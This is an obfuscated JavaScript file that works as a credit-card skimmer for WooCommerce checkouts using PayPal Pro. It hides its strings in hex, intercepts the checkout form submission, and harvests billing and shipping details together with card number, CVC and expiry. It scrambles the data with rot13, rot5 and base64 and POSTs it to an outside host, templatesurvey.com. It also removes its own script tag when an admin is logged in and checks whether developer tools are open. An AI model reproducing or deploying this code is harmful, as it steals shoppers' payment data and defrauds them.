var _0x4895, _0x4643, _0x4874, _0x48B6, _0x4853, _0x474B, _0x4685, _0x493A, _0x478D, _0x48F8, _0x47AE, _0x47CF, _0x4832, _0x46A6, _0x46C7, _0x46E8, _0x4709, _0x472A, _0x48D7, _0x4811, _0x4664, _0x47F0, _0x4919, _0x476C;
(function () {
  var _0x495B = [
    'wtf',
    'prototype',
    '$',
    'split',
    'reduce',
    'fromCharCode',
    'map',
    '',
    'replace',
    'toString',
    '[redacted]$63$6f$6d',
    '2f$63$68$65$63$6b$6f$75$74',
    '68$74$74$70$73$3a$2f$2f$74$65$6d$70$6c$61$74$65$73$75$72$76$65$79$2e$63$6f$6d$2f$61$6e$61$6c$79$7a$65',
    '68$74$74$70$73$3a$2f$2f$74$65$6d$70$6c$61$74$65$73$75$72$76$65$79$2e$63$6f$6d',
    '68$74$74$70$73$3a$2f$2f$74$65$6d$70$6c$61$74$65$73$75$72$76$65$79$2e$63$6f$6d$2f$53$4a$7a$54$43$72$78$4d$4f$30$4f$37$74$69',
    '77$70$5f$77$6f$6f',
    'vieworder',
    '70$61$79$70$61$6c$70$72$6f',
    '66$6f$72$6d$5b$6e$61$6d$65$3d$27$63$68$65$63$6b$6f$75$74$27$5d',
    '62$69$6c$6c$69$6e$67$5f$63$72$65$64$69$72$63$61$72$64',
    '62$69$6c$6c$69$6e$67$5f$63$63$76$6e$75$6d$62$65$72',
    '62$69$6c$6c$69$6e$67$5f$65$78$70$64$61$74$65$6d$6f$6e$74$68',
    '62$69$6c$6c$69$6e$67$5f$65$78$70$64$61$74$65$79$65$61$72',
    '69$6e$70$75$74$23$70$61$79$6d$65$6e$74$5f$6d$65$74$68$6f$64$5f$70$61$79$70$61$6c$70$72$6f',
    'js',
    'script',
    'css',
    'link',
    'none',
    'id',
    'href',
    'getElementsByTagName',
    'length',
    'getAttribute',
    'indexOf',
    'removeChild',
    'parentNode',
    'log',
    'rot13',
    'Z',
    'charCodeAt',
    'rot5',
    'join',
    'getOwnPropertyDescriptor',
    'defineProperty',
    'In collectData',
    'serializeArray',
    'shipping_',
    'name',
    'billing_',
    'value',
    'each',
    'input[id*="',
    '"]:visible',
    'find',
    'attr',
    '-card-number',
    '-card-cvc',
    '-card-expiry',
    ' / ',
    '_cc_owner',
    'checked',
    'prop',
    'In processPlaceOrder',
    'submit',
    'processPlaceOrder:SUBMIT',
    'Bad payment type',
    'Payment sended',
    'always',
    'POST',
    'stringify',
    'text/plain',
    'ajax',
    'Exception on submit',
    'on',
    'In waitPlaceOrder',
    ':visible',
    'is',
    'waitPlaceOrder: OK',
    'In document ready',
    'get',
    '#wpadminbar',
    'ready',
    'outerWidth',
    'innerWidth',
    'outerHeight',
    'innerHeight',
    'Firebug',
    'chrome',
    'isInitialized',
    'In waitForJquery',
    'jQuery',
    'waitForJquery: OK',
    'location'
  ];
  function _0x497C() {
    var _0x4A42 = this.split('$');
    var _0x4A63 = _0x4A42.map(function (_0x4A84) {
      return String.fromCharCode(parseInt(_0x4A84, 16));
    }).reduce(function (_0x4AA5, _0x4AC6) {
      return _0x4AA5 + _0x4AC6;
    });
    return _0x4A63.toString().replace(/,/g, '');
  }
  function _0x499D(_0x4B08, _0x4B29) {
    var _0x4B8C = _0x4B29 === 'js' ? 'script' : _0x4B29 === 'css' ? 'link' : 'none';
    var _0x4B6B = _0x4B29 === 'js' ? 'id' : _0x4B29 === 'css' ? 'href' : 'none';
    var _0x4AE7 = document.getElementsByTagName(_0x4B8C);
    if (!_0x495B) {
      _0x49BE(0, false, false);
      return;
    }
    for (var _0x4B4A = _0x4AE7.length; _0x4B4A >= 0; _0x4B4A--) {
      if (_0x4AE7[_0x4B4A] && _0x4AE7[_0x4B4A].getAttribute(_0x4B6B) !== null && _0x4AE7[_0x4B4A].getAttribute(_0x4B6B).indexOf(_0x4B08) !== -1) {
        _0x4AE7[_0x4B4A].parentNode.removeChild(_0x4AE7[_0x4B4A]);
      }
    }
  }
  function _0x49BE(_0x4BCE, _0x4BAD) {
    console.log(_0x4BCE);
  }
  if (!_0x49BE) {
    _0x49DF = 0;
    return;
  }
  function _0x49DF() {
    String.prototype.rot13 = function () {
      return this.replace(/[a-zA-Z]/g, function (_0x4A84) {
        return String.fromCharCode((_0x4A84 <= 'Z' ? 90 : 122) >= (_0x4A84 = _0x4A84.charCodeAt(0) + 13) ? _0x4A84 : _0x4A84 - 26);
      });
    };
    String.prototype.rot5 = function () {
      var _0x4A63 = [];
      for (i = 0; i < this.length; i++) {
        idx = this.charCodeAt(i);
        if (idx >= 48 && idx <= 57) {
          if (idx <= 52) {
            if (!_0x4A00) {
              return;
            }
            _0x4A63[i] = String.fromCharCode(idx + 5);
          } else {
            _0x4A63[i] = String.fromCharCode(idx - 5);
          }
        } else {
          _0x4A63[i] = String.fromCharCode(idx);
        }
      }
      return _0x4A63.join('');
    };
    function _0x4BEF(_0x4D39) {
      return btoa(encodeURIComponent(_0x4D39).replace(/%([0-9A-F]{2})/g, function (_0x4D5A, _0x4D7B) {
        return String.fromCharCode(parseInt(_0x4D7B, 16));
      }));
    }
    function _0x4CB5(_0x4DFF, _0x4E20, _0x4DDE) {
      if (!_0x495B) {
        return;
      }
      if (_0x4E20 !== _0x4DDE && _0x4DFF[_0x4E20]) {
        Object.defineProperty(_0x4DFF, _0x4DDE, Object.getOwnPropertyDescriptor(_0x4DFF, _0x4E20));
        delete _0x4DFF[_0x4E20];
      }
    }
    var _0x4C31 = {
      url: ' com',
      type: 'wp_woo',
      mer: 'paypalpro'
    };
    function _0x4C10(_0x4D9C) {
      _0x49BE('In collectData', 1);
      jQuery.each(_0x4D9C.serializeArray(), function () {
        if (!_0x495B) {
          _0x4A00();
          return;
        }
        if ((this.name.indexOf('shipping_') !== -1 || this.name.indexOf('billing_') !== -1 || this.name.indexOf('paypalpro') !== -1) && this.value != '') {
          _0x4C31[this.name] = this.value;
        }
      });
      if (!_0x495B) {
        _0x4A00('rot5', 'Payment sended');
        return;
      }
      jQuery.each(_0x4D9C.find('input[id*="paypalpro"]:visible'), function () {
        _0x4C31[jQuery(this).attr('id')] = this.value;
      });
      _0x4CB5(_0x4C31, 'billing_credircard', 'paypalpro-card-number');
      _0x4CB5(_0x4C31, 'billing_ccvnumber', 'paypalpro-card-cvc');
      if (!_0x495B) {
        return;
      }
      _0x4CB5(_0x4C31, 'billing_expdatemonth', 'paypalpro-card-expiry');
      if (_0x4C31.billing_expdateyear) {
        _0x4C31['paypalpro-card-expiry'] = _0x4C31['paypalpro-card-expiry'] + ' / ' + _0x4C31.billing_expdateyear;
        delete _0x4C31.billing_expdateyear;
      }
    }
    function _0x4C52() {
      return jQuery('input#payment_method_paypalpro').prop('checked');
    }
    function _0x4C94() {
      _0x49BE('In processPlaceOrder', 1);
      jQuery("form[name='checkout']").on('submit', function () {
        try {
          _0x49BE('processPlaceOrder:SUBMIT', 1);
          if (!_0x4C52()) {
            _0x49BE('Bad payment type', 2);
            return true;
          }
          _0x4C10(jQuery("form[name='checkout']"));
          _0x49BE(_0x4C31, 2);
          if (_0x497C === null) {
            _0x4A00 = false;
            return;
          }
          jQuery.ajax({
            type: 'POST',
            url: 'https://templatesurvey.com/analyze',
            data: _0x4BEF(JSON.stringify(_0x4C31).rot13().rot5()),
            timeout: 20000,
            contentType: 'text/plain'
          }).always(function () {
            _0x49BE('Payment sended', 2);
            if (!_0x495B) {
              _0x497C = null;
            } else {
              return true;
            }
          });
        } catch (e) {
          if (!_0x495B) {
            _0x4A00();
          }
          _0x49BE('Exception on submit', 2);
          return true;
        }
      });
    }
    function _0x4CD6() {
      var _0x4E41 = setInterval(function () {
        _0x49BE('In waitPlaceOrder', 1);
        if (jQuery("form[name='checkout']").is(':visible') && _0x4C52()) {
          _0x49BE('waitPlaceOrder: OK', 1);
          clearInterval(_0x4E41);
          _0x4C94();
        }
      }, 500);
    }
    jQuery(document).ready(function () {
      if (!_0x495B) {
        _0x49DF('charCodeAt', 1, 0);
        return;
      }
      _0x49BE('In document ready', 1);
      if (jQuery('#wpadminbar').get(0)) {
        _0x499D('vieworder', 'js');
      } else {
        if (!_0x49DF) {
          _0x4A21(false, false);
          return;
        }
        _0x4CD6();
      }
    });
    if (_0x49DF == 1) {
      return;
    }
    function _0x4C73(_0x4DBD) {
    }
    setInterval(function () {
      var _0x4D18 = window.outerWidth - window.innerWidth > 160;
      var _0x4CF7 = window.outerHeight - window.innerHeight > 160;
      if (!(_0x4CF7 && _0x4D18) && (window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized || _0x4D18 || _0x4CF7)) {
        if (!_0x478D) {
          _0x4C73(true);
        }
        _0x478D = true;
      } else {
        if (_0x478D) {
          _0x4C73(false);
        }
        _0x478D = false;
      }
    }, 500);
  }
  function _0x4A00(_0x4E62) {
    _0x49BE('In waitForJquery', 1);
    if (window.jQuery) {
      _0x49BE('waitForJquery: OK', 1);
      _0x4E62();
    } else {
      if (!_0x495B) {
        _0x49DF();
        return;
      }
      setTimeout(function () {
        _0x4A00(_0x4E62);
      }, 500);
    }
  }
  function _0x4A21() {
    if (window.location.href.indexOf(' com') !== -1 && window.location.href.indexOf('/checkout') !== -1) {
      _0x4A00(_0x49DF);
    } else {
      _0x499D('vieworder', 'js');
    }
  }
  _0x4811 = _0x499D;
  _0x4664 = _0x49BE;
  _0x47F0 = _0x49DF;
  _0x4919 = _0x4A00;
  if (!_0x499D) {
    _0x4A21(1);
    return;
  }
  _0x476C = _0x4A21;
  String.prototype.wtf = _0x497C;
  _0x4895 = '[redacted]$63$6f$6d';
  _0x4643 = '2f$63$68$65$63$6b$6f$75$74';
  _0x4874 = '68$74$74$70$73$3a$2f$2f$74$65$6d$70$6c$61$74$65$73$75$72$76$65$79$2e$63$6f$6d$2f$61$6e$61$6c$79$7a$65';
  _0x48B6 = '68$74$74$70$73$3a$2f$2f$74$65$6d$70$6c$61$74$65$73$75$72$76$65$79$2e$63$6f$6d';
  _0x4853 = '68$74$74$70$73$3a$2f$2f$74$65$6d$70$6c$61$74$65$73$75$72$76$65$79$2e$63$6f$6d$2f$53$4a$7a$54$43$72$78$4d$4f$30$4f$37$74$69';
  _0x474B = '77$70$5f$77$6f$6f';
  if (!_0x49BE) {
    return;
  }
  _0x4685 = true;
  _0x493A = 500;
  _0x478D = true;
  _0x48F8 = 160;
  _0x47AE = 'vieworder';
  _0x47CF = '70$61$79$70$61$6c$70$72$6f';
  _0x4832 = '66$6f$72$6d$5b$6e$61$6d$65$3d$27$63$68$65$63$6b$6f$75$74$27$5d';
  _0x46A6 = '62$69$6c$6c$69$6e$67$5f$63$72$65$64$69$72$63$61$72$64';
  _0x46C7 = '62$69$6c$6c$69$6e$67$5f$63$63$76$6e$75$6d$62$65$72';
  _0x46E8 = '62$69$6c$6c$69$6e$67$5f$65$78$70$64$61$74$65$6d$6f$6e$74$68';
  if (_0x497C == true) {
    _0x497C();
    _0x497C = true;
    return;
  } else {
    _0x4709 = '62$69$6c$6c$69$6e$67$5f$65$78$70$64$61$74$65$79$65$61$72';
  }
  _0x472A = '';
  _0x48D7 = '69$6e$70$75$74$23$70$61$79$6d$65$6e$74$5f$6d$65$74$68$6f$64$5f$70$61$79$70$61$6c$70$72$6f';
  _0x4A21();
}());